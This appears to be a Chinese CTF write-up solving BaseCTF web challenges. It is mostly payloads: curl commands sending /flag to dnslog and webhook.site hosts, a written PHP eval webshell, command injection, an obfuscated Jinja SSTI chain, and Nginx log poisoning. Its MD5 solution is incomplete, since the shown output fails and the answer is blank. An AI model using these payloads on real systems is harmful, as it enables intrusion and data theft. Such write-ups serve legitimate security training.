###### 编写payload

```shell
cmd=curl `cat /flag`.ociqfw.dnslog.cn
```

##### 方法三

###### 编写payload

```shell
cmd=curl https://webhook.site/#!/view/f9280e85-7baa-4f28-8689-4d20879c0792/`cat /flag`
```

##### 方法四

###### 编写payload

```shell
cmd=echo '<?php eval($_POST[0]);?>'>php.php
```

#### 题目答案

##### 得到答案

```shell
BaseCTF{9acdce99-1c72-46e3-938d-3376096cceee}
```



### 喵喵喵´•ﻌ•`

#### 题目信息

> ## 喵喵喵´•ﻌ•`250 pts
>
> **出题:** Delete
> **难度:** 入门
>
> ------
>
> 小明在学习PHP的过程中发现，原来php也可以执行系统的命令，于是开始疯狂学习.....

#### 解题过程

##### 查看题目

```php
<?php
highlight_file(__FILE__);
error_reporting(0);

$a = $_GET['DT'];

eval($a);

?>
```

##### 编写payload

```shell
GET DT=system('cat /f*');
```

##### 发起攻击

```shell
GET DT=system('cat /f*');
```

```shell
BaseCTF{55e4d17b-570e-47c1-a964-2b40e74c7c4f}
```

#### 题目答案

##### 最终脚本

```shell
GET DT=system('cat /f*');
```

##### 得到答案

```shell
BaseCTF{55e4d17b-570e-47c1-a964-2b40e74c7c4f}
```



### 复读机

#### 题目信息

> ## 复读机250 pts
>
> **出题:** 晨曦
> **难度:** 简单
>
> ------
>
> 一位复读机发明了一个复读机来复读flag

#### 解题过程

##### 查看题目

```shell
BaseCTF{test}
```

```shell
BaseCTF{test}
```

```shell
BaseCTF{{{1+1}}}
```

```
你想干嘛？ 杂鱼~ 杂鱼~
```

**分析**

- ssti注入绕过

##### 漏洞测试

```shell
BaseCTF{%print(''['_''_''cl''as''s''_''_']['_''_''ba''se''_''_']['_''_''su''bc''la''ss''es''_''_']()[137])%}
```

```shell
BaseCTF<class 'os._wrap_close'>
```

```shell
BaseCTF{%print(''['_''_cl''ass_''_']['_''_ba''se_''_']['_''_subcla''sses_''_']()[137]['_''_in''it_''_']['_''_glo''bals_''_']['po''pen']('env')['rea''d']())%}
```

```shell
BaseCTFKUBERNETES_SERVICE_PORT=443 KUBERNETES_PORT=tcp://10.96.0.1:443 HOSTNAME=basectf2024-af31bd546a754175 SHLVL=1 PYTHON_PIP_VERSION=23.0.1 HOME=/root OLDPWD=/ FLASK_RUN_FROM_CLI=true GPG_KEY=A035C8C19219BA821ECEA86B64E628F8D684696D WERKZEUG_SERVER_FD=3 _=/usr/local/bin/flask PYTHON_GET_PIP_URL=https://github.com/pypa/get-pip/raw/66d8a0f637083e2c3ddffc0cb1e65ce126afb856/public/get-pip.py KUBERNETES_PORT_443_TCP_ADDR=10.96.0.1 PATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin KUBERNETES_PORT_443_TCP_PORT=443 KUBERNETES_PORT_443_TCP_PROTO=tcp GZCTF_FLAG=no_FLAG LANG=C.UTF-8 PYTHON_VERSION=3.10.14 PYTHON_SETUPTOOLS_VERSION=65.5.1 KUBERNETES_SERVICE_PORT_HTTPS=443 KUBERNETES_PORT_443_TCP=tcp://10.96.0.1:443 PWD=/app KUBERNETES_SERVICE_HOST=10.96.0.1 PYTHON_GET_PIP_SHA256=6fb7b781206356f45ad79efbb19322caa6c2a5ad39092d0d44d0fec94117e118 GZCTF_TEAM_ID=3440
```

**分析**

- OLDPWD=/ 可用来绕过

##### 发起攻击

```shell
BaseCTF{%print(''['_''_cl''ass_''_']['_''_ba''se_''_']['_''_subcla''sses_''_']()[137]['_''_in''it_''_']['_''_glo''bals_''_']['po''pen']('cd $OLDPWD;cat flag')['rea''d']())%}
```

```shell
BaseCTFBaseCTF{bd6ba752-a754-48bd-8299-07f8db7e76f1}
```

#### 题目答案

##### 最终payload

```shell
BaseCTF{%print(''['_''_cl''ass_''_']['_''_ba''se_''_']['_''_subcla''sses_''_']()[137]['_''_in''it_''_']['_''_glo''bals_''_']['po''pen']('cd $OLDPWD;cat flag')['rea''d']())%}
```

##### 得到答案

```shell
BaseCTF{bd6ba752-a754-48bd-8299-07f8db7e76f1}
```



### 所以你说你懂 MD5?

#### 题目信息

> ## 所以你说你懂 MD5?250 pts
>
> **出题:** Kengwang
> **难度:** 中等
>
> ------
>
> 所以你说你懂 MD5?
>
> 
>
> 可以了解一下 `MD5 长度拓展攻击`

#### 解题过程

##### 查看题目

```php
<?php
session_start();
highlight_file(__FILE__);
// 所以你说你懂 MD5 了?

$apple = $_POST['apple'];
$banana = $_POST['banana'];
if (!($apple !== $banana && md5($apple) === md5($banana))) {
    die('加强难度就不会了?');
}

// 什么? 你绕过去了?
// 加大剂量!
// 我要让他成为 string
$apple = (string)$_POST['appple'];
$banana = (string)$_POST['bananana'];
if (!((string)$apple !== (string)$banana && md5((string)$apple) == md5((string)$banana))) {
    die('难吗?不难!');
}

// 你还是绕过去了?
// 哦哦哦, 我少了一个等于号
$apple = (string)$_POST['apppple'];
$banana = (string)$_POST['banananana'];
if (!((string)$apple !== (string)$banana && md5((string)$apple) === md5((string)$banana))) {
    die('嘻嘻, 不会了? 没看直播回放?');
}

// 你以为这就结束了
if (!isset($_SESSION['random'])) {
    $_SESSION['random'] = bin2hex(random_bytes(16)) . bin2hex(random_bytes(16)) . bin2hex(random_bytes(16));
}

// 你想看到 random 的值吗?
// 你不是很懂 MD5 吗? 那我就告诉你他的 MD5 吧
$random = $_SESSION['random'];
echo md5($random);
echo '<br />';

$name = $_POST['name'] ?? 'user';

// check if name ends with 'admin'
if (substr($name, -5) !== 'admin') {
    die('不是管理员也来凑热闹?');
}

$md5 = $_POST['md5'];
if (md5($random . $name) !== $md5) {
    die('伪造? NO NO NO!');
}

// 认输了, 看样子你真的很懂 MD5
// 那 flag 就给你吧
echo "看样子你真的很懂 MD5";
echo file_get_contents('/flag');
```

**分析**

- MD5绕过

##### 编写脚本

```shell
fastcoll -o m1 m2
```

```python
import requests

url = "http://challenge.imxbt.cn:32447/"

with open("m1", "rb") as file:
    m1 = file.read()
with open("m2", "rb") as file:
    m2 = file.read()

files = {
    'apple[]': (None, b'1'),
    'banana[]': (None, b'2'),

    'appple': (None, b'QNKCDZO'),
    'bananana': (None, b'240610708'),

    'apppple': (None, m1),
    'banananana': (None, m2),
}

requestsSession = requests.Session()
result = requestsSession.post(url, files=files)

print(result.text)
```

##### 发起攻击

```shell
D:\Environment\python\python-3.13.0\python.exe D:\Work\test\python\1\Main.py 
<code><span style="color: #000000">
<br />echo&nbsp;</span><span style="color: #0000BB">file_get_contents</span><span style="color: #007700">(</span><span style="color: #DD0000">'/flag'</span><span style="color: #007700">);</span>
</span>
</code>1933915c176debd27371917f7241f0b0<br />不是管理员也来凑热闹?

进程已结束，退出代码为 0
```

#### 题目答案

##### 最终脚本

```python
import requests

url = "http://challenge.imxbt.cn:32447/"

with open("m1", "rb") as file:
    m1 = file.read()
with open("m2", "rb") as file:
    m2 = file.read()

files = {
    'apple[]': (None, b'1'),
    'banana[]': (None, b'2'),

    'appple': (None, b'QNKCDZO'),
    'bananana': (None, b'240610708'),

    'apppple': (None, m1),
    'banananana': (None, m2),
}

requestsSession = requests.Session()
result = requestsSession.post(url, files=files)

print(result.text)
```

##### 得到答案

```shell
...
```



### 滤个不停

#### 题目信息

> ## 滤个不停250 pts
>
> **出题:** Datch
> **难度:** 中等
>
> ------
>
> 过滤这么多还怎么玩！等等....不对劲

#### 解题过程

##### 查看题目

```php
<?php
highlight_file(__FILE__);
error_reporting(0);

$incompetent = $_POST['incompetent'];
$Datch = $_POST['Datch'];

if ($incompetent !== 'HelloWorld') {
    die('写出程序员的第一行问候吧！');
}

//这是个什么东东？？？
$required_chars = ['s', 'e', 'v', 'a', 'n', 'x', 'r', 'o'];
$is_valid = true;

foreach ($required_chars as $char) {
    if (strpos($Datch, $char) === false) {
        $is_valid = false;
        break;
    }
}

if ($is_valid) {

    $invalid_patterns = ['php://', 'http://', 'https://', 'ftp://', 'file://' , 'data://', 'gopher://'];

    foreach ($invalid_patterns as $pattern) {
        if (stripos($Datch, $pattern) !== false) {
            die('此路不通换条路试试?');
        }
    }


    include($Datch);
} else {
    die('文件名不合规 请重试');
}
?>
```

**分析**

- 通过User-Agent向Nignx日志注入木马，进而通过include文件包含漏洞触发木马

##### 编写payload

```shell
http://challenge.imxbt.cn:31219/
POST incompetent=HelloWorld&Datch=/var/log/nginx/access.log&x=system('cat /flag');
User-Agent <?php eval($_POST['cmd']); ?>
```

##### 发起攻击

```shell
http://challenge.imxbt.cn:31219/
POST incompetent=HelloWorld&Datch=/var/log/nginx/access.log&x=system('cat /flag');
User-Agent <?php eval($_POST['cmd']); ?>
```

```shell
10.10.235.192 - - [04/May/2026:00:09:02 +0800] "GET / HTTP/1.1" 502 559 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36 Edg/147.0.0.0" "-" 10.10.235.192 - - [04/May/2026:00:09:02 +0800] "GET /favicon.ico HTTP/1.1" 200 5472 "http://challenge.imxbt.cn:31219/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36 Edg/147.0.0.0" "-" 10.10.235.192 - - [04/May/2026:00:09:05 +0800] "GET / HTTP/1.1" 200 5478 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36 Edg/147.0.0.0" "-" 10.10.235.192 - - [04/May/2026:00:09:05 +0800] "GET /favicon.ico HTTP/1.1" 200 5472 "http://challenge.imxbt.cn:31219/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36 Edg/147.0.0.0" "-" 10.10.235.192 - - [04/May/2026:00:09:12 +0800] "POST / HTTP/1.1" 200 6358 "http://challenge.imxbt.cn:32034/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36" "-" 10.10.235.192 - - [04/May/2026:00:09:12 +0800] "GET /favicon.ico HTTP/1.1" 200 5472 "http://challenge.imxbt.cn:31219/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36" "-" 10.10.235.192 - - [04/May/2026:00:10:05 +0800] "POST / HTTP/1.1" 200 6816 "http://challenge.imxbt.cn:31219/" "-" "-" 10.10.235.192 - - [04/May/2026:00:10:05 +0800] "GET /favicon.ico HTTP/1.1" 200 5472 "http://challenge.imxbt.cn:31219/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36" "-" 10.10.235.192 - - [04/May/2026:00:10:28 +0800] "POST / HTTP/1.1" 200 7170 "http://challenge.imxbt.cn:31219/" "BaseCTF{dfd90b3e-da2e-4a18-a175-5585beb4b0b9} " "-" 10.10.235.192 - - [04/May/2026:00:10:28 +0800] "GET /favicon.ico HTTP/1.1" 200 5472 "http://challenge.imxbt.cn:31219/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36" "-" 10.10.235.192 - - [04/May/2026:00:10:31 +0800] "POST / HTTP/1.1" 200 7280 "http://challenge.imxbt.cn:31219/" "BaseCTF{dfd90b3e-da2e-4a18-a175-5585beb4b0b9} " "-" 10.10.235.192 - - [04/May/2026:00:10:31 +0800] "GET /favicon.ico HTTP/1.1" 200 5472 "http://challenge.imxbt.cn:31219/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36" "-" 10.10.235.192 - - [04/May/2026:00:10:40 +0800] "GET /txt.txt HTTP/1.1" 200 5478 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36" "-" 10.10.235.192 - - [04/May/2026:00:10:40 +0800] "GET /favicon.ico HTTP/1.1" 200 5478 "http://challenge.imxbt.cn:31219/txt.txt" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36" "-" 10.10.235.192 - - [04/May/2026:00:10:48 +0800] "GET /favicon.ico HTTP/1.1" 200 5472 "http://challenge.imxbt.cn:31219/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36" "-" 10.10.235.192 - - [04/May/2026:00:10:50 +0800] "POST / HTTP/1.1" 200 7286 "http://challenge.imxbt.cn:31219/" "BaseCTF{dfd90b3e-da2e-4a18-a175-5585beb4b0b9} " "-" 10.10.235.192 - - [04/May/2026:00:10:51 +0800] "GET /favicon.ico HTTP/1.1" 200 5472 "http://challenge.imxbt.cn:31219/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36" "-" 10.10.235.192 - - [04/May/2026:00:11:10 +0800] "POST / HTTP/1.1" 200 8919 "http://challenge.imxbt.cn:31219/" "BaseCTF{dfd90b3e-da2e-4a18-a175-5585beb4b0b9} " "-" 10.10.235.192 - - [04/May/2026:00:11:10 +0800] "GET /favicon.ico HTTP/1.1" 200 5472 "http://challenge.imxbt.cn:31219/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36" "-" 10.10.235.192 - - [04/May/2026:00:11:28 +0800] "GET / HTTP/1.1" 200 5472 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36" "-" 10.10.235.192 - - [04/May/2026:00:11:28 +0800] "GET /txt.txt HTTP/1.1" 200 5472 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36" "-" 10.10.235.192 - - [04/May/2026:00:12:23 +0800] "POST / HTTP/1.1" 200 9865 "http://challenge.imxbt.cn:31219/" "
```

#### 题目答案

##### 最终payload

```shell
http://challenge.imxbt.cn:31219/
POST incompetent=HelloWorld&Datch=/var/log/nginx/access.log&x=system('cat /flag');
User-Agent <?php eval($_POST['cmd']); ?>
```

##### 得到答案

```shell
BaseCTF{dfd90b3e-da2e-4a18-a175-5585beb4b0b9}
```



# 队伍

## 名称

**菜鸟对对队**



## 口号

**对对对对对**



## 成员

### 队长

- **probie**

### 队员

- **probie**



## 留言

### probie

- **暂无**



## 成果

### 排名

- **0 / 0**

### 解题

- **0 / 0**

### 分数

- **0 / 0**